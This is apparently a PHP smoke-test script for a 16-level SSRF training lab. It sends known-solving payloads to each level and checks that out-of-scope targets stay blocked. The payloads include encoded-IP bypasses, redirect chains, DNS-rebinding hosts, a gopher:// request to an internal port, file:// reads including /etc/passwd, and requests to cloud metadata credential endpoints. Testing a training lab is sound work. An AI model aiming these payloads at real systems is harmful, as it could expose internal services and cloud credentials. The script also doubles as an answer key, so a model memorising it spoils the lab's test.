<?php

declare(strict_types=1);

/**
 * 真实业务端点冒烟测试。
 * 用法：php tests/smoke.php
 * 可选：LAB_BASE_URL=http://127.0.0.1:8080 php tests/smoke.php
 */

$base = rtrim(getenv('LAB_BASE_URL') ?: 'http://127.0.0.1:8080', '/');
$secretPath = realpath(__DIR__ . '/../secrets/level6.txt');
$secretUrl = 'file://' . str_replace('\\', '/', (string) $secretPath);
$wrongFileUrl = DIRECTORY_SEPARATOR === '\\' ? 'file:///C:/Windows/win.ini' : 'file:///etc/passwd';

$cases = [
    ['level' => 1, 'route' => '/products/import-image', 'param' => 'image_url', 'value' => 'http://10.220.2.6:8080/', 'targetRequired' => true],
    ['level' => 2, 'route' => '/merchants/import-logo', 'param' => 'logo_url', 'value' => 'http://2130706433:8081/admin'],
    ['level' => 3, 'route' => '/campaigns/check-asset', 'param' => 'asset_url', 'value' => 'http://127.0.0.1:8081/internal/debug?source=shop.local'],
    ['level' => 4, 'route' => '/messages/link-preview', 'param' => 'preview_url', 'value' => 'http://127.0.0.1:8083/redirect?to=http%3A%2F%2F127.0.0.1%3A8081%2Fadmin'],
    ['level' => 5, 'route' => '/profiles/avatar-preview', 'param' => 'avatar_url', 'value' => 'http://avatar-7f3a.cdn-preview.ssrf.lab:8082/latest/meta-data/iam/security-credentials/lab-role'],
    ['level' => 6, 'route' => '/knowledge-base/preview-attachment', 'param' => 'attachment_url', 'value' => $secretUrl],
    ['level' => 7, 'route' => '/profiles/sync-avatar', 'param' => 'avatar_url', 'value' => 'http://shop.local@127.0.0.1:8081/internal/parser'],
    ['level' => 8, 'route' => '/admin/assets/migrate', 'param' => 'asset_url', 'value' => 'http://0177.0.0.1:8081/internal/encoding'],
    ['level' => 9, 'route' => '/partners/media-sync', 'param' => 'media_url', 'value' => 'http://media-2f9c.dual-cdn.ssrf.lab:8081/internal/dns-mixed'],
    ['level' => 10, 'route' => '/messages/rich-preview', 'param' => 'preview_url', 'value' => 'http://127.0.0.1:8083/redirect/chain?to=http%3A%2F%2F127.0.0.1%3A8081%2Fadmin'],
    ['level' => 11, 'route' => '/webhook/test', 'param' => 'base_url', 'value' => 'http://127.0.0.1:8080/webhook/test', 'headers' => ['X-Forwarded-Host: 127.0.0.1:8081']],
    ['level' => 12, 'route' => '/reports/export', 'param' => 'callback_url', 'value' => 'http://10.220.2.6:8080/index?host=example.com', 'targetRequired' => true],
    ['level' => 13, 'route' => '/marketing/collect-asset', 'param' => 'resource_url', 'value' => 'gopher://127.0.0.1:6380/_GET%20flag%0D%0A'],
    ['level' => 14, 'route' => '/cloud/import-asset', 'param' => 'asset_url', 'value' => 'http://metadata.google.internal:8082/computeMetadata/v1/instance/service-accounts/default/token'],
    ['level' => 15, 'route' => '/sharing/card', 'param' => 'page_url', 'value' => 'http://127.0.0.1:8084/renderer-page?target=http%3A%2F%2F127.0.0.1%3A8081%2Finternal%2Frenderer'],
    ['level' => 16, 'route' => '/feeds/import', 'param' => 'feed_url', 'value' => 'http://127.0.0.1:8084/malicious-feed.xml'],
];

/**
 * @return array{status:int, body:string, json:mixed, error:string}
 */
function lab_smoke_request(string $method, string $url, ?array $payload = null, array $headers = []): array
{
    $ch = curl_init($url);
    if ($ch === false) {
        return ['status' => 0, 'body' => '', 'json' => null, 'error' => 'curl_init failed'];
    }

    $headerLines = array_merge(['Content-Type: application/json'], $headers);
    $options = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => strtoupper($method),
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_HTTPHEADER => $headerLines,
        CURLOPT_PROXY => '',
        CURLOPT_NOPROXY => '*',
    ];

    if ($payload !== null) {
        $options[CURLOPT_POSTFIELDS] = json_encode($payload);
    }

    curl_setopt_array($ch, $options);
    $body = curl_exec($ch);
    $status = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    return [
        'status' => $status,
        'body' => is_string($body) ? $body : '',
        'json' => is_string($body) ? json_decode($body, true) : null,
        'error' => $error,
    ];
}

function lab_smoke_post_case(string $base, array $case): array
{
    $payload = [$case['param'] => $case['value']];

    return lab_smoke_request('POST', $base . $case['route'], $payload, $case['headers'] ?? []);
}

$failed = [];

foreach ($cases as $case) {
    $response = lab_smoke_post_case($base, $case);
    $json = $response['json'];
    $solved = is_array($json) && ($json['result']['solved'] ?? false) === true;
    $hasSource = is_array($json) && is_string($json['source']['snippet'] ?? null) && $json['source']['snippet'] !== '';
    $message = is_array($json)
        ? (string) ($json['result']['validation']['message'] ?? '')
        : ($response['error'] !== '' ? $response['error'] : 'no response');

    $passed = $solved && $hasSource;

    if (!$passed && !empty($case['targetRequired']) && is_array($json)) {
        $decision = (string) ($json['result']['validation']['decision'] ?? '');
        if ($decision === 'error' && preg_match('/(?:failed to connect|connection refused|timed out|could not connect|请求失败)/i', $message) === 1) {
            printf("SKIP L%-2d %-42s target 10.220.2.6:8080 unreachable\n", $case['level'], $case['route']);
            continue;
        }
    }

    printf("%s L%-2d %-42s%s\n", $passed ? 'PASS' : 'FAIL', $case['level'], $case['route'], $passed ? '' : ' - ' . ($solved ? 'source missing' : $message));
    if (!$passed) {
        $failed[] = 'L' . $case['level'] . ($solved ? ' (source)' : '');
    }
}

// 第 5、9 关依赖每次请求重新实例化的解析器，连续跑两次验证没有跨请求状态。
foreach ([5, 9] as $level) {
    $case = $cases[$level - 1];
    $first = lab_smoke_post_case($base, $case);
    $second = lab_smoke_post_case($base, $case);
    $ok = is_array($first['json']) && is_array($second['json'])
        && ($first['json']['result']['solved'] ?? false) === true
        && ($second['json']['result']['solved'] ?? false) === true;
    printf("%s L%-2d repeated resolver request twice\n", $ok ? 'PASS' : 'FAIL', $level);
    if (!$ok) {
        $failed[] = 'L' . $level . '-repeat';
    }
}

$boundaryChecks = [
    ['label' => 'external IP target is blocked', 'route' => '/products/import-image', 'payload' => ['image_url' => 'http://192.0.2.10:8082/latest/meta-data']],
    ['label' => 'non-loopback hostname is blocked', 'route' => '/products/import-image', 'payload' => ['image_url' => 'http://example.com:8080/']],
    ['label' => 'non-lab port is blocked', 'route' => '/products/import-image', 'payload' => ['image_url' => 'http://127.0.0.1:9090/']],
    ['label' => 'rebind host outside level 5 is blocked', 'route' => '/products/import-image', 'payload' => ['image_url' => 'http://avatar-7f3a.cdn-preview.ssrf.lab:8082/latest/meta-data']],
    ['label' => 'gopher port 6379 is blocked', 'route' => '/marketing/collect-asset', 'payload' => ['resource_url' => 'gopher://127.0.0.1:6379/_PING']],
    ['label' => 'file outside level 6 secret is blocked', 'route' => '/knowledge-base/preview-attachment', 'payload' => ['attachment_url' => $wrongFileUrl]],
];

foreach ($boundaryChecks as $check) {
    $response = lab_smoke_request('POST', $base . $check['route'], $check['payload']);
    $blocked = is_array($response['json']) && ($response['json']['result']['blocked'] ?? false) === true;
    $sourceLeaked = is_array($response['json']) && array_key_exists('source', $response['json']);
    $passed = $blocked && !$sourceLeaked;
    printf("%s %s%s\n", $passed ? 'PASS' : 'FAIL', $check['label'], $sourceLeaked ? ' (source leaked)' : '');
    if (!$passed) {
        $failed[] = $check['label'];
    }
}

// 成功请求但未命中 FLAG 时，源码也不能下发。
$notSolved = lab_smoke_request('POST', $base . '/products/import-image', [
    'image_url' => 'http://127.0.0.1:8083/',
]);
$notSolvedOk = is_array($notSolved['json'])
    && ($notSolved['json']['result']['solved'] ?? true) === false
    && !array_key_exists('source', $notSolved['json']);
printf("%s non-solving request does not receive source\n", $notSolvedOk ? 'PASS' : 'FAIL');
if (!$notSolvedOk) {
    $failed[] = 'source-gating';
}

// /api/probe 已退役。
$retired = lab_smoke_request('POST', $base . '/api/probe', ['level' => 1, 'url' => 'http://127.0.0.1:8082/']);
printf("%s retired /api/probe returns 404\n", $retired['status'] === 404 ? 'PASS' : 'FAIL');
if ($retired['status'] !== 404) {
    $failed[] = 'retired-probe';
}

// bootstrap 暴露真实业务元数据，且不下发 successFlag。
$bootstrap = lab_smoke_request('GET', $base . '/api/bootstrap');
$challenges = is_array($bootstrap['json']) ? ($bootstrap['json']['challenges'] ?? []) : [];
$bootstrapOk = count($challenges) === 16;
foreach ($challenges as $challenge) {
    $bootstrapOk = $bootstrapOk
        && isset($challenge['business']['method'], $challenge['business']['api'], $challenge['business']['param'])
        && !array_key_exists('successFlag', $challenge)
        && !array_key_exists('snippet', $challenge)
        && !array_key_exists('codeLabel', $challenge)
        && !array_key_exists('target', $challenge);
}
$level11 = $challenges[10] ?? [];
$bootstrapOk = $bootstrapOk && (($level11['business']['header'] ?? '') === 'X-Forwarded-Host');
printf("%s bootstrap exposes minimal challenge metadata only\n", $bootstrapOk ? 'PASS' : 'FAIL');
if (!$bootstrapOk) {
    $failed[] = 'bootstrap';
}

if ($failed !== []) {
    echo PHP_EOL . 'Failures: ' . implode(', ', $failed) . PHP_EOL;
    exit(1);
}

echo PHP_EOL . 'All SSRF lab smoke tests passed.' . PHP_EOL;
